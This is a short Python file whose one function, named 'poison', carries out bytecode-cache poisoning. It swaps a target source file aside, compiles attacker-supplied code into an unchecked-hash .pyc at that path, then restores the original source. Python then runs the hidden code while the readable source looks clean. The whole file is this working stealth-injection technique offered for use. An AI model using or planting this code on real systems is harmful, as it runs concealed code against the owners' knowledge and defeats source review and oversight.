from os import rename
from random import random
from py_compile import compile


def poison(path: str, code: str) -> None:
    
    temporary = str(random())
    
    rename(path, temporary)
    open(path, "w").write(code)
    compile(path, invalidation_mode=3)
    rename(temporary, path)
